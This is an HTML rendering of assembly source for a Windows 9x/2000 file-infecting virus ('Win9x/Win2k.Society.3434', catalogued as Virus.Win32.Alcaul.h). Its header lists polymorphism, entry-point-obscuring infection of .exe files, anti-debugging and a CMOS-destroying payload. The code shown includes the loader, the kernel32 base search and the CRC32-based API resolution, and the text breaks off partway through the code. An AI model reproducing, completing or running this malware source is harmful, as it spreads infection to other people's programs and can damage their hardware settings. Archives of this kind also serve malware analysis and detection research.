<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Alcaul.h - society.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;                   Win9x/Win2k.Society.3434 (c) necr0mancer</span><span class="sc0">
</span><span class="sc1">;               december 2001</span><span class="sc0">
</span><span class="sc1">;ring-3 PE infector</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Features:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; *     Works only in win2k &amp; win9x,but can work on winNT(I haven't it!) if</span><span class="sc0">
</span><span class="sc1">;       you add it kernel base on table (see source).</span><span class="sc0">
</span><span class="sc1">; *     Polymorphic (use NPE32 engine).</span><span class="sc0">
</span><span class="sc1">; *     Some infection methods (EPO,standart, .reloc OR .debug overwrite).</span><span class="sc0">
</span><span class="sc1">; *     Simple antidebug.</span><span class="sc0">
</span><span class="sc1">; *     Payload (on trace with td32:)) CMOS kill.)</span><span class="sc0">
</span><span class="sc1">; *     Not infecting winzip self-extactors &amp; upx-packed files</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Tnx: to all who write stuff.</span><span class="sc0">
</span><span class="sc1">;                          Infection sheme:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;                           ÚÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                           ³   main    ³     ÍÍÍÍÍ  - incorect secton size</span><span class="sc0">
</span><span class="sc1">;                           ÀÄÄÄÄÄÂÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;                           ÚÄÄÄÄÄÁÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                           ³ find reloc³</span><span class="sc0">
</span><span class="sc1">;                           ÀÄÄÄÄÄÂÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;                       ÚÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                    ÚÄÄÁÄÄÄ¿           ÚÄÄÄÁÄÄ¿</span><span class="sc0">
</span><span class="sc1">;    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´findedÆÍÍÍÍÍÍ»    ³failed³</span><span class="sc0">
</span><span class="sc1">;    ³               ÀÄÄÂÄÄÄÙ      º    ÀÄÄÄÂÄÄÙ</span><span class="sc0">
</span><span class="sc1">;    ³        ÚÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄ¿    º   ÚÄÄÄÄÁÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;    ³        ³ EPO infection ³  ÚÄ×ÄÄÄ´ find .debug ³</span><span class="sc0">
</span><span class="sc1">;    ³        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  ³ º   ÀÄÄÄÄÂÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;    ³                           ³ º        ³</span><span class="sc0">
</span><span class="sc1">;    ³ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿    ³ º   ÚÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;    ÀÄ´Overwrite infection ÃÄÄÄÄÙ ÈÍÍÍµ"standart" infection ³</span><span class="sc0">
</span><span class="sc1">;      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">



</span><span class="sc9">include</span><span class="sc0">  </span><span class="sc2">1.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">  </span><span class="sc5">win.inc</span><span class="sc0">

</span><span class="sc5">PAGE_READWRITE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">DEBUG</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;no debug-release;)</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">


</span><span class="sc5">VIRTUAL_SIZE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_endvbody</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">PHYSICAL_SIZE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_fbodyend</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">DEBUG</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc2">.586p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">message_title</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[Dekadance] has been start.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_message</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Credo:'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Dekadance is lifestyle.'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
               </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Copyleft (c) 2001 necr0mancer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">_emulation</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;jmp viri</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_callz_manager</span><span class="sc0">

</span><span class="sc5">Original</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MB_ICONEXCLAMATION</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message_title</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_message</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">                        </span><span class="sc1">; call    ExitProcess</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Run loader</span><span class="sc0">
</span><span class="sc5">_callz_manager</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pushfd</span><span class="sc0">                                  </span><span class="sc1">;save flags&amp;regs</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">

</span><span class="sc5">@cm</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc4">&lt;-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@GetDelta</span><span class="sc4">&gt;</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@GetDelta</span><span class="sc0">                         </span><span class="sc1">;get delta</span><span class="sc0">
</span><span class="sc5">@@GetDelta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">


                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                            </span><span class="sc1">;AL=# in function table</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">nop_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_start</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">nop_call</span><span class="sc0"> </span><span class="sc5">@cm</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">90909090h</span><span class="sc0">                       </span><span class="sc1">;write nop for next call</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;eax=# in function table</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                               </span><span class="sc1">;eax*8</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                              </span><span class="sc1">;first mng_call?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">table_offset_exist</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0b8h</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">__edi</span><span class="sc4">)</span><span class="sc0">                      </span><span class="sc1">;mov edi,xxxxxxxx</span><span class="sc0">
                </span><span class="sc5">delta_tbl</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">get_me_out</span><span class="sc0">

</span><span class="sc5">table_offset_exist</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta_tbl</span><span class="sc0"> </span><span class="sc5">@cm</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;save table_pointer</span><span class="sc0">
                                                        </span><span class="sc1">;for next calls</span><span class="sc0">
</span><span class="sc5">get_me_out</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;restore old eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp._eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;write ret adr</span><span class="sc0">

                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">popfd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;Virii part</span><span class="sc0">

</span><span class="sc5">@ex</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">             </span><span class="sc4">&lt;-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">                              </span><span class="sc1">;get Delta</span><span class="sc0">
</span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">eq</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">endif</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AfterData</span><span class="sc0">                     </span><span class="sc1">;go to main part</span><span class="sc0">

</span><span class="sc1">;                          === some data ===</span><span class="sc0">

</span><span class="sc5">imagebase</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">
</span><span class="sc5">OldRVA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Original</span><span class="sc4">-</span><span class="sc2">00400000h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">fmask</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">tbl</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">77e80000h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0Bff70000h</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">jmp_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Original</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Mask_table</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">025FFh</span><span class="sc0">                               </span><span class="sc1">;jmp xxxxxxx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;=============================================================================</span><span class="sc0">
</span><span class="sc5">Fsize</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Voff</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Foff</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MZbase</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">AfterData</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                                 </span><span class="sc1">;mov eax,xxxxxxxx</span><span class="sc0">
                </span><span class="sc5">reTT_need</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                          </span><span class="sc1">;flag of type infection</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_need_heh</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldRVA</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;restore old entrypoint</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;FOR returning in prog</span><span class="sc0">

</span><span class="sc5">no_need_heh</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmp_table</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;copy adr_table</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jmp_tmp_table</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@@error_handle</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc1">;find kernel base</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;set SEH</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;possible kernel bases</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">__kernel32</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_lodsd</span><span class="sc0">
</span><span class="sc5">_ex</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;restore SEH</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_yet</span><span class="sc0">                              </span><span class="sc1">;&amp; exit</span><span class="sc0">

</span><span class="sc1">;=============================================================================</span><span class="sc0">

</span><span class="sc5">@@@error_handle</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc5">_lodsd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;end of table ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_ex</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">__kernel32</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">                  </span><span class="sc1">;test on MZ</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_lodsd</span><span class="sc0">
</span><span class="sc5">__ok</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;restore SEH</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">

</span><span class="sc5">sys_ok</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_Table</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;table of CRC32</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_adr</span><span class="sc0"> </span><span class="sc5">@ex</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;table of needed</span><span class="sc0">
                                                        </span><span class="sc1">;function's adresses</span><span class="sc0">
</span><span class="sc5">Ft_repeat</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_proc_adr</span><span class="sc0">                       </span><span class="sc1">;find adress</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;no finded :(</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">end_Ft_cycle</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Ft_repeat</span><span class="sc0">

</span><span class="sc5">end_Ft_cycle</span><span class="sc4">:</span><span class="sc0">


                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000000</span><span class="sc0">                         </span><span class="sc1">; GET RANDOM NUMBER</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                                                        </span><span class="sc1">; save it</span><span class="sc0">
